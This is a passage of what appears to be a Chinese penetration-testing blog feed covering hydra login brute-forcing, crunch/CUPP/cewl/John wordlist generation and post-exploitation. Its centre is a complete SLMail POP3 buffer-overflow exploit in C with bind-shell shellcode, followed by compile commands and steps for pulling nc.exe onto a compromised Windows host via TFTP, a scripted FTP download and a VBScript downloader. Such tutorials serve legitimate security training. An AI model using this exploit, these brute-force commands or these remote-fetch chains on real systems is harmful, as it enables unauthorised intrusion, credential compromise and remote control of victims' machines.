class="headerlink" title="HTTP表单身份认证"></a><strong>HTTP表单身份认证</strong></h4><pre><code>hydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:S=index.php&quot; -Vhydra -l admin -P pass.lst 1.1.1.1 http-post-form &quot;/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=L in:Login Failed&quot; -V    #失败/foo.php:user=^USER^&amp;pass=^PASS^:S=success:C=/page/cookie:H =X-Foo:FooC:先访问指定页面取得cookieH:指定http头https-post-form、http-get-form、https-get-form-S：使用SSL连接</code></pre><h4 id="pw-inspector-hydra软件包附带工具"><a href="#pw-inspector-hydra软件包附带工具" class="headerlink" title="pw-inspector hydra软件包附带工具"></a><strong>pw-inspector</strong> hydra软件包附带工具</h4><p>按长度和字符集筛选字典</p><pre><code>pw-inspector -i /usr/share/wordlists/nmap.lst -o p.lst -l pw-inspector -i /usr/share/wordlists/nmap.lst -o P.lst -u</code></pre><h4 id="密码破解效率"><a href="#密码破解效率" class="headerlink" title="密码破解效率"></a><strong>密码破解效率</strong></h4><ul><li>密码复杂度(字典命中率)</li><li>带宽、协议、服务器性能、客户端性能</li><li>锁定阈值</li><li>单位时间最大登陆请求次数</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hydra </tag>
            
            <tag> 在线密码破解 </tag>
            
            <tag> Linux密码破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码破解方法及Crunch字典生成工具</title>
      <link href="/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
      <url>/2015/05/21/Password_Attacks/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E6%B3%95%E5%8F%8ACrunch%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h3><p>目标系统实施了强安全措施</p><ul><li>安装了所有补丁 </li><li>无任何已知漏洞 </li><li>无应用层漏洞 </li><li>攻击面最小化<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a><strong>社会工程学</strong></h4>获取目标系统用户身份 </li><li>非授权用户不受信，认证用户可以访问守信资源 </li><li>已有用户账号权限受限，需要提权 </li><li>不会触发系统报警</li></ul><h4 id="身份认证方法"><a href="#身份认证方法" class="headerlink" title="身份认证方法"></a><strong>身份认证方法</strong></h4><ul><li>证明你是你声称你是的那个人</li><li>你知道什么（账号密码、pin、passphrase） </li><li>你有什么（令牌、token、key、证书、密宝、手机）</li><li>你是谁（指纹、视网膜、虹膜、掌纹、声纹、面部识别） </li><li>以上方法结合使用（多因素身份认证）<br>基于互联网的身份验证仍以账号密码为主要形式</li></ul><blockquote><h3 id="密码破解方法"><a href="#密码破解方法" class="headerlink" title="密码破解方法"></a><strong>密码破解方法</strong></h3></blockquote><h4 id="人工猜解"><a href="#人工猜解" class="headerlink" title="人工猜解"></a><strong>人工猜解</strong></h4><ul><li>垃圾桶工程</li><li>被动信息收集 <h4 id="基于字典暴力破解（主流）"><a href="#基于字典暴力破解（主流）" class="headerlink" title="基于字典暴力破解（主流）"></a>基于字典暴力破解（主流）</h4><h4 id="键盘空间字符暴破"><a href="#键盘空间字符暴破" class="headerlink" title="键盘空间字符暴破"></a>键盘空间字符暴破</h4></li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li>保存有用户名和密码的文本文件 </li><li>/usr/share/wordlist </li><li>/usr/share/wfuzz/wordlist </li><li>/usr/share/seclists</li></ul><blockquote><h3 id="字典-1"><a href="#字典-1" class="headerlink" title="字典"></a><strong>字典</strong></h3></blockquote><h4 id="键盘空间字符爆破"><a href="#键盘空间字符爆破" class="headerlink" title="键盘空间字符爆破"></a>键盘空间字符爆破</h4><ul><li>全键盘空间字符</li><li>部分键盘空间字符 (基于规则)</li><li>数字、小写字母、大写字母、符号、空格、瑞典字符、高位ASCII码</li></ul><h4 id="crunch-创建字典"><a href="#crunch-创建字典" class="headerlink" title="crunch 创建字典"></a><strong>crunch 创建字典</strong></h4><pre><code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]&lt;charset string&gt; 默认是小写字符crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100-b 按大小分割字典文件(kb/kib、mb/mib、gb/gib)-c 每个字典的行数以上两个参数必须与-o START 结合使用-d 同一字符连贯出现数量(11 / aaa)</code></pre><h4 id="使用字符集"><a href="#使用字符集" class="headerlink" title="使用字符集"></a><strong>使用字符集</strong></h4><p><code>crunch 4 4 -f /usr/share/crunch/charset.lst lalpha-sv -o 1.txt</code></p><h4 id="无重复字符"><a href="#无重复字符" class="headerlink" title="无重复字符"></a><strong>无重复字符</strong></h4><p><code>crunch 1 1 -p 1234567890 | more</code><br>    必须是最后一个参数<br>    最大、最小字符长度失效，但必须存在<br>    与-s 参数不兼容（-s 指定起始字符串）<br><code>crunch 4 4 0123456789 -s 9990</code></p><ul><li>读取文件中每行内容作为基本字符生成字典<br><code>crunch 1 1 -q read</code></li></ul><h4 id="字典组成规则"><a href="#字典组成规则" class="headerlink" title="字典组成规则"></a><strong>字典组成规则</strong></h4><pre><code>crunch 6 6 -t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 密码攻击 </category>
          
          <category> 暴力破解 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Wordlist </tag>
            
            <tag> crunch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透测试之选择和修改EXP</title>
      <link href="/2015/02/08/Exploits/%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%89%E6%8B%A9%E5%92%8C%E4%BF%AE%E6%94%B9EXP/"/>
      <url>/2015/02/08/Exploits/%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E9%80%89%E6%8B%A9%E5%92%8C%E4%BF%AE%E6%94%B9EXP/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>网上公开的EXP代码</strong><ul><li>选择可信赖的EXP源</li><li>Exploit-db</li><li>SecurityFocus</li><li>Searchsploit</li><li>有能力修改EXP(python,perl,ruby,c,c++…)</li></ul></li></ul><p><strong>646.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак</span></span><br><span class="line"><span class="comment">недействительный 31337 Team</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [*] bind 4444 </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = </span><br><span class="line"><span class="string">"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"</span></span><br><span class="line"><span class="string">"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"</span></span><br><span class="line"><span class="string">"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"</span></span><br><span class="line"><span class="string">"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"</span></span><br><span class="line"><span class="string">"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"</span></span><br><span class="line"><span class="string">"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"</span></span><br><span class="line"><span class="string">"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"</span></span><br><span class="line"><span class="string">"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"</span></span><br><span class="line"><span class="string">"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"</span></span><br><span class="line"><span class="string">"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"</span></span><br><span class="line"><span class="string">"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"</span></span><br><span class="line"><span class="string">"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"</span></span><br><span class="line"><span class="string">"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"</span></span><br><span class="line"><span class="string">"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"</span></span><br><span class="line"><span class="string">"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"</span></span><br><span class="line"><span class="string">"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"</span></span><br><span class="line"><span class="string">"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"</span></span><br><span class="line"><span class="string">"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"</span></span><br><span class="line"><span class="string">"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"</span></span><br><span class="line"><span class="string">"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">int</span> sock)</span> </span>&#123;</span><br><span class="line">      FILE *test;</span><br><span class="line">      <span class="keyword">int</span> *ptr;</span><br><span class="line">      <span class="keyword">char</span> userbuf[] = <span class="string">"USER madivan\r\n"</span>;</span><br><span class="line">      <span class="keyword">char</span> evil[<span class="number">3001</span>];</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">3012</span>];</span><br><span class="line">      <span class="keyword">char</span> receive[<span class="number">1024</span>];</span><br><span class="line">      <span class="keyword">char</span> nopsled[] = <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">                       <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>;</span><br><span class="line">      <span class="built_in">memset</span>(buf, <span class="number">0x00</span>, <span class="number">3012</span>);</span><br><span class="line">      <span class="built_in">memset</span>(evil, <span class="number">0x00</span>, <span class="number">3001</span>);</span><br><span class="line">      <span class="built_in">memset</span>(evil, <span class="number">0x43</span>, <span class="number">3000</span>);</span><br><span class="line">      ptr = &amp;evil;</span><br><span class="line">      ptr = ptr + <span class="number">652</span>; <span class="comment">// 2608 </span></span><br><span class="line">      <span class="built_in">memcpy</span>(ptr, &amp;nopsled, <span class="number">16</span>);</span><br><span class="line">      ptr = ptr + <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">memcpy</span>(ptr, &amp;shellcode, <span class="number">317</span>);</span><br><span class="line">      *(<span class="keyword">long</span>*)&amp;evil[<span class="number">2600</span>] = <span class="number">0x7CB41010</span>; <span class="comment">// JMP ESP XP 7CB41020 FFE4 JMP ESP</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// banner</span></span><br><span class="line">      recv(sock, receive, <span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] %s"</span>, receive);</span><br><span class="line">      <span class="comment">// user</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] Sending Username...\n"</span>);</span><br><span class="line">      send(sock, userbuf, <span class="built_in">strlen</span>(userbuf), <span class="number">0</span>);</span><br><span class="line">      recv(sock, receive, <span class="number">200</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] %s"</span>, receive);</span><br><span class="line">      <span class="comment">// passwd</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[+] Sending Evil buffer...\n"</span>);</span><br><span class="line">      <span class="built_in">sprintf</span>(buf, <span class="string">"PASS %s\r\n"</span>, evil);</span><br><span class="line">      <span class="comment">//test = fopen("test.txt", "w");</span></span><br><span class="line">      <span class="comment">//fprintf(test, "%s", buf);</span></span><br><span class="line">      <span class="comment">//fclose(test);</span></span><br><span class="line">      send(sock, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[*] Done! Connect to the host on port 4444...\n\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect_target</span><span class="params">(<span class="keyword">char</span> *host, u_short port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">hp</span>;</span></span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line"></span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>,<span class="number">0</span>), &amp;wsa);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line"></span><br><span class="line">    hp = gethostbyname(host);</span><br><span class="line">    <span class="keyword">if</span> (hp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"gethostbyname() error!\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Connecting to %s\n"</span>, host);</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(port);</span><br><span class="line">    sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);</span><br><span class="line"></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (sock &lt; <span class="number">0</span>)      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[-] socket blah?\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">connect</span>(sock, (struct sockaddr *) &amp;sa, <span class="keyword">sizeof</span>(sa)) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;<span class="built_in">printf</span>(<span class="string">"[-] connect() blah!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">          &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] Connected to %s\n"</span>, host);</span><br><span class="line">    <span class="keyword">return</span> sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> data, port;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( argc &lt; <span class="number">2</span> ) &#123; <span class="built_in">printf</span>(<span class="string">"usage: slmail-ex.exe &lt;host&gt; \n\n"</span>); <span class="built_in">exit</span>(<span class="number">0</span>); &#125;</span><br><span class="line">    port = <span class="number">110</span>;</span><br><span class="line">    sock = connect_target(argv[<span class="number">1</span>], port);</span><br><span class="line">    exploit(sock);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类unix环境下编译<br>返回地址与我们的环境不符<br>反弹shell硬编码了回连IP地址<br>缓冲区偏移量与我们的环境不符<br>目标IP硬编码<br>windows环境下编译</p><pre><code>apt-get install mingw32dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32i586-mingw32msvc-gcc 646.c -lws2_32 -o sl.exewine sl.exe 192.168.254.254</code></pre><ul><li><p>不同的EXP</p><ul><li>不同的系统补丁</li><li>软件版本</li><li>不同的offset,shellcode</li></ul></li><li><p>扫描探测目标系统版本,搭建适当的测试环境</p><ul><li>避免一锤子测试</li></ul></li><li><p>修改公开的EXP满足不同环境需要</p></li><li><p>了解漏洞原理,修改溢出代码</p></li><li><p>后漏洞利用阶段</p></li><li><p>上传工具</p><ul><li><p>上传文件</p><ul><li>持久控制</li><li>扩大对目标系统的控制能力</li></ul></li><li><p>linux</p><ul><li>netcat</li><li>curl</li><li>wget</li></ul></li><li><p>windows</p><ul><li><p>缺少预装的下载工具</p></li><li><p>非交互模式shell</p><ul><li>类NC远程控制shell</li><li><code>ftp 1.1.1.1</code></li></ul></li><li><p>使用TFTP传输文件</p><ul><li>xp,2003默认安装</li><li>win7,2008需要单独添加</li><li>经常被边界防火墙过滤</li></ul></li><li><p>kali</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir &#x2F;tftp</span><br><span class="line">atftpd --daemon --port 69 &#x2F;tftp#启动</span><br><span class="line">cp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;nc.exe &#x2F;tftp&#x2F;</span><br><span class="line">chown -R nobody &#x2F;tftp</span><br><span class="line">netstat -pantu | grep 69 #查看端口和服务启动状态</span><br></pre></td></tr></table></figure></li><li><p>windows</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tftp -i 192.168.1.2 get nc.exe</span><br><span class="line">tasklist#查看进程</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="使用FTP传输文件"><a href="#使用FTP传输文件" class="headerlink" title="使用FTP传输文件"></a><strong>使用FTP传输文件</strong></h4><ul><li><p>kali</p><ul><li><code>apt-get install pure-ftpd</code></li><li><code>ftp.sh</code>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">groupadd ftpgroup</span><br><span class="line">useradd -g ftpgroup -d &#x2F;dev&#x2F;null -s &#x2F;etc ftpuser</span><br><span class="line">pure-pw useradd owl -u ftpuser -d &#x2F;ftphome</span><br><span class="line">pure-pw mkdb</span><br><span class="line">cd &#x2F;etc&#x2F;pure-ftpd&#x2F;auth&#x2F;</span><br><span class="line">ln -s ..conf&#x2F;PureDB 60pdb</span><br><span class="line">mkdir -p &#x2F;ftphome</span><br><span class="line">chown -R ftpuser:ftpgroup &#x2F;ftphom&#x2F;</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;pure-ftpd restart</span><br></pre></td></tr></table></figure></li></ul></li><li><p>windows</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo open 192.168.254.117 21&gt;ftp.txt</span><br><span class="line">echo owl&gt;&gt;ftp.txt</span><br><span class="line">echo password&gt;&gt;ftp.txt</span><br><span class="line">echo bin&gt;&gt;ftp.txt</span><br><span class="line">echo GET nc.exe&gt;&gt;ftp.txt</span><br><span class="line">echo bye&gt;&gt;ftp.txt</span><br><span class="line">ftp -s:ftp.txt</span><br></pre></td></tr></table></figure></li></ul><h4 id="使用VBSCRIPT传输文件"><a href="#使用VBSCRIPT传输文件" class="headerlink" title="使用VBSCRIPT传输文件"></a><strong>使用VBSCRIPT传输文件</strong></h4><ul><li>wget.vbs</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs</span><br><span class="line">echo StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs</span><br><span class="line">echo Const HTTPREQUEST_PROXYSETTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs</span><br><span class="line">echo Dim http, varByteArray, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs</span><br><span class="line">echo Err.Clear &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set http CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is Nothing Then Set http &#x3D; CreateObject(&quot;MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo If http Is nothing Then Set http &#x3D; CreateObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo http.Open &quot;GET&quot;, strURL, False &gt;&gt; wget.vbs</span><br><span class="line">echo http.Send  &gt;&gt; wget.vbs</span><br><span class="line">echo varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs</span><br><span class="line">echo Set http &#x3D; Nothing &gt;&gt; wget.vbs</span><br><span class="line">echo Set fs &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;) &gt;&gt; wget.vbs</span><br><span class="line">echo Set ts &#x3D; fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs</span><br><span class="line">echo strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs</span><br><span class="line">echo For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs</span><br><span class="line">echo Next &gt;&gt; wget.vbs</span><br><span class="line">echo ts.Close 